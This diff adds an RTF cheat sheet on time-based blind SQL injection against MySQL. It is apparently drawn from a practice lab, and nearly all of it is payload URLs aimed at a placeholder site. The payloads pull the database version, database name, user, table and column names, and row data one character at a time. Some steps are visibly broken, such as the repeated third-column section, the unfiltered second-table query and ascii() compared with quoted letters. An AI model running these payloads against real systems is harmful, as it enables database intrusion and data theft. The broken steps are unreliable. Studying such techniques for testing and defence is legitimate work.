@@ -1,0 +1,548 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf470
+{\fonttbl\f0\fnil\fcharset0 Calibri;\f1\fswiss\fcharset0 ArialMT;\f2\fmodern\fcharset0 CourierNewPSMT;
+\f3\froman\fcharset0 TimesNewRomanPSMT;\f4\ftech\fcharset0 Wingdings-Regular;}
+{\colortbl;\red255\green255\blue255;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww21900\viewh9620\viewkind0
+\deftab720
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f0\b\fs26 \cf1 \cb0 \expnd0\expndtw0\kerning0
+TIME-BASED Injection - Vulnerability Testing in MySQL:\
+
+\f1\b0 \
+if (clause, sleep(10), null)\
+\
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 INTEGER: http://[site]/page.asp?id=1 and if ((select database())=\'93security\'94,sleep(10),null)\'97 
+\f1 \
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select database())=\'93security\'94,sleep(10),null)\'97+-
+\b \
+\
+	HINT: WHEN LOOKING FOR A CHAR USE > TO FIND IF IT IS A A-Z, a-z OR 1-9\
+\
+
+\f1\b0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97
+\f0\b \
+\
+TIME-BASED Extraction of VERSION:\
+
+\f1\b0 \
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 INTEGER: http://[site]/page.asp?id=1 and if ((select version()) like \'935%\'94,sleep(10),null)\'97 
+\f1 \
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select version()) like \'935%\'94,sleep(10),null)\'97+-
+\b \
+\
+IF the sleep command runs then mysql is equal to 5 else try 4\
+
+\f1\b0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+
+\f0\b \
+TIME-BASED Extraction of CURRENT DATABASE NAME\
+
+\f1\b0 \
+
+\f0 This follows the same method as used above to grab the USER, but we will change the reference to DB_NAME(). Again, we will need to check the length first and then to use the LIMIT to move from one character position to the next until we have captured all values and then convert. It looks like this:\
+
+\f1 \
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(database(),1,1)) =\'93s\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(database(),2,1)) =\'93e\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(database(),3,1)) =\'93c\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(database(),4,1)) =\'93u\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(database(),5,1)) =\'93r\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(database(),6,1)) =\'93i\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(database(),7,1)) =\'93t\'94,sleep(10),null)\'97+-\
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(database(),8,1)) =\'93y\'94,sleep(10),null)\'97+-
+\b \
+\
+
+\b0 Database Name = security
+\f1 \
+
+\f0\b \
+
+\f1\b0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+
+\f0\b \
+TIME-BASED Extraction of CURRENT USER NAME\
+
+\f1\b0 \
+
+\f0 This follows the same method as used above to grab the USER, but we will change the reference to DB_NAME(). Again, we will need to check the length first and then to use the LIMIT to move from one character position to the next until we have captured all values and then convert. It looks like this:\
+
+\f1 \
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(user(),1,1)) =\'93r\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(user(),2,1)) =\'93o\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(user(),3,1)) =\'93o\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(user(),4,1)) =\'93t\'94,sleep(10),null)\'97+-
+\b \
+\
+
+\b0 USER = root
+\b \
+
+\f1\b0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+
+\f0\b \
+TIME-BASED Extraction of 1
+\fs22 \super st
+\fs26 \nosupersub  TABLE IN DB:\
+\
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 INTEGER: http://[site]/page.asp?id=1 and if ((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1) =\'93e\'94,sleep(10),null)\'97 
+\f1 \
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1) =\'93e\'94,sleep(10),null)\'97+-
+\b \
+\
+\
+
+\b0 This will get the first table name of the current database.\
+
+\f1 \
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1) =\'93e\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if (ascii((select substr(table_name,6,1) from information_schema.tables where table_schema=database() limit 0,1))>1,sleep(10),null)\'97+-
+\b \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f1\b0 \cf1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f2 \cf1 	o
+\f3 \'a0\'a0 
+\f0 Result = Table name of 6 characters in length\
+
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f4 \cf1 \'a7
+\f3 \'a0 
+\f0 Remember you can use greater than or less than symbols to help narrow things down when starting from the unknown\
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f1 \cf1 \
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1) =\'93e\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(table_name,2,1) from information_schema.tables where table_schema=database() limit 0,1) =\'93m\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(table_name,3,1) from information_schema.tables where table_schema=database() limit 0,1) =\'93a\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(table_name,4,1) from information_schema.tables where table_schema=database() limit 0,1) =\'93i\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(table_name,5,1) from information_schema.tables where table_schema=database() limit 0,1) =\'93l\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(table_name,6,1) from information_schema.tables where table_schema=database() limit 0,1) =\'93s\'94,sleep(10),null)\'97+-
+\b \
+
+\b0 \
+Table Name = emails\
+\
+
+\b TIME-BASED Extraction of 2
+\fs22 \super st
+\fs26 \nosupersub  TABLE IN DB:\
+\
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 INTEGER: http://[site]/page.asp?id=1 and if ((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1) =\'93e\'94,sleep(10),null)\'97 
+\f1 \
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1) =\'93e\'94,sleep(10),null)\'97+-
+\b \
+\
+
+\b0 This will get the second table name of the current database\
+
+\f1 \
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(table_name,1,1) from information_schema.tables where table_name!=\'91emails\'92 limit 0,1) =\'93e\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if (ascii((select substr(table_name,1,1) from information_schema.tables where table_name!=\'91emails\'92 limit 0,1))>1,sleep(10),null)\'97+-
+\b \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f1\b0 \cf1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f2 \cf1 	o
+\f3 \'a0\'a0 
+\f0 Result = Table name of 6 characters in length\
+
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f4 \cf1 \'a7
+\f3 \'a0 
+\f0 Remember you can use greater than or less than symbols to help narrow things down when starting from the unknown\
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f1 \cf1 \
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(table_name,1,1) from information_schema.tables where table_name!=\'91emails\'92 limit 0,1) =\'93c\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(table_name,2,1) from information_schema.tables where table_name!=\'91emails\'92 limit 0,1) =\'93h\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(table_name,3,1) from information_schema.tables where table_name!=\'91emails\'92 limit 0,1) =\'93a\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(table_name,4,1) from information_schema.tables where table_name!=\'91emails\'92 limit 0,1) =\'93r\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(table_name,5,1) from information_schema.tables where table_name!=\'91emails\'92 limit 0,1) =\'93a\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and if ((select substr(table_name,6,1) from information_schema.tables where table_name!=\'91emails\'92 limit 0,1) =\'93c\'94,sleep(10),null)\'97+-
+\b \
+
+\b0 \
+Table Name = character_SETS
+\b \
+
+\f1\b0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+
+\f0\b \
+TIME-BASED Extraction of 1
+\fs22 \super st
+\fs26 \nosupersub  TABLE COLUMNS:\
+
+\f1\b0 \
+
+\f0 Now that you have figured out the database name and first table name let\'92s enumerate some columns from the table(s) we found. It will look like this for the first column from the first table:\
+
+\f1 \
+
+\f0 This will get the first column name char of the emails table.\
+
+\f1 \
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 INTEGER: http://[site]/page.asp?id=1 and if ((select substr(column_name,1,1) from information_schema.columns where table_name=\'93emails\'94 limit 0,1) =\'93e\'94,sleep(10),null)\'97 
+\f1 \
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if ((select substr(column_name,1,1) from information_schema.columns where table_name=\'93emails\'94 limit 0,1) =\'93e\'94,sleep(10),null)\'97+-
+\b \
+\
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if (ascii((select substr(column_name,1,1) from information_schema.columns where table_name=\'93emails\'94 limit 0,1) )>1,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if (ascii((select substr(column_name,2,1) from information_schema.columns where table_name=\'93emails\'94 limit 0,1) )>1,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if (ascii((select substr(column_name,3,1) from information_schema.columns where table_name=\'93emails\'94 limit 0,1) )>1,sleep(10),null)\'97+-
+\b \
+\
+
+\f2\b0 	o
+\f3 \'a0\'a0 
+\f0 Result = Column name of 2 characters in length\
+
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f4 \cf1 \'a7
+\f3 \'a0 
+\f0 Remember you can use greater than or less than symbols to help narrow things down when starting from the unknown\
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f1 \cf1 \
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if ((select substr(column_name,1,1) from information_schema.columns where table_name=\'93emails\'94 limit 0,1) =\'93i\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if ((select substr(column_name,2,1) from information_schema.columns where table_name=\'93emails\'94 limit 0,1) =\'93d\'94,sleep(10),null)\'97+-
+\b \
+\
+
+\b0 Column Name = id
+\b \
+\
+TIME-BASED Extraction of 2
+\fs22 \super nd
+\fs26 \nosupersub  COLUMN NAME
+\b0 :\
+
+\f1 \
+To find the next column you have to use column_name!=\'91id\'92\
+\
+\
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if ((select substr(column_name,1,1) from information_schema.columns where table_name=\'93emails\'94 and column_name!=\'91id\'92 limit 0,1) =\'93e\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if ((select substr(column_name,2,1) from information_schema.columns where table_name=\'93emails\'94 and column_name!=\'91id\'92 limit 0,1) =\'93m\'94,sleep(10),null)\'97+-\
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if ((select substr(column_name,3,1) from information_schema.columns where table_name=\'93emails\'94 and column_name!=\'91id\'92 limit 0,1) =\'93a\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if ((select substr(column_name,4,1) from information_schema.columns where table_name=\'93emails\'94 and column_name!=\'91id\'92 limit 0,1) =\'93i\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if ((select substr(column_name,5,1) from information_schema.columns where table_name=\'93emails\'94 and column_name!=\'91id\'92 limit 0,1) =\'93l\'94,sleep(10),null)\'97+-
+\b \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f1\b0 \cf1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f0 \cf1 Column Name = email
+\b \
+\
+TIME-BASED Extraction of 3
+\fs22 \super nd
+\fs26 \nosupersub  COLUMN NAME
+\b0 :\
+
+\f1 \
+To find the next column you have to use column_name!=\'91id\'92 and column_name!=\'91email\'92\
+\
+\
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if ((select substr(column_name,1,1) from information_schema.columns where table_name=\'93emails\'94 and column_name!=\'91id\'92 limit 0,1) =\'93e\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if ((select substr(column_name,2,1) from information_schema.columns where table_name=\'93emails\'94 and column_name!=\'91id\'92 limit 0,1) =\'93m\'94,sleep(10),null)\'97+-\
+
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if ((select substr(column_name,3,1) from information_schema.columns where table_name=\'93emails\'94 and column_name!=\'91id\'92 limit 0,1) =\'93a\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if ((select substr(column_name,4,1) from information_schema.columns where table_name=\'93emails\'94 and column_name!=\'91id\'92 limit 0,1) =\'93i\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if ((select substr(column_name,5,1) from information_schema.columns where table_name=\'93emails\'94 and column_name!=\'91id\'92 limit 0,1) =\'93l\'94,sleep(10),null)\'97+-
+\b \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f1\b0 \cf1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f0 \cf1 Column Name = email
+\b \
+
+\f1\b0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+
+\f0\b \
+TIME-BASED Extraction of Data:\
+
+\f1\b0 \
+
+\f0 We will be extracting information now that we have gotten the table (emails) and column names (id), from the current database (security). We will unfortunately need to extract the results one field at a time. In order to get the first field (id) from the emails table starting on row 1 we would do this: \'a0
+\f1 \
+\
+
+\f2 o
+\f3 \'a0\'a0 
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if (ascii((select substr(id,1,1) from emails limit 0,1))=49,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if (ascii((select substr(id,1,1) from emails limit 1,1))=50,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if (ascii((select substr(id,1,1) from emails limit 2,1))=51,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if (ascii((select substr(id,1,1) from emails limit 3,1))=52,sleep(10),null)\'97+-
+\b \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f1\b0 \cf1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f0 \cf1 Results for first id entry = 49 = id = 1\
+Results for second id entry = 50 = id = 2\
+Results for third id entry = 51 = id = 3\
+Results for fourth id entry = 52= id = 4\
+
+\f1 \
+if there was another column called username:\
+\
+First username:\
+
+\f2 o
+\f3 \'a0\'a0 
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if (ascii((select substr(username,1,1) from emails limit 0,1))=\'93a\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if (ascii((select substr(username,2,1) from emails limit 0,1))=\'93d\'94,sleep(10),null)\'97+-\
+\
+
+\b Second username:\
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if (ascii((select substr(username,1,1) from emails limit 1,1))=\'93a\'94,sleep(10),null)\'97+-
+\b \
+
+\f2\b0 o
+\f3 \'a0\'a0 
+\f2 o
+\f3 \'a0\'a0 
+\f0 STRING: http://[site]/page.asp?id=x' and  if (ascii((select substr(username,2,1) from emails limit 1,1))=\'93a\'94,sleep(10),null)\'97+-
+\f1 \
+\
+\pard\pardeftab720\sl260\partightenfactor0
+\cf1 \
+\pard\pardeftab720\sl300\partightenfactor0
+\cf1 \
+}
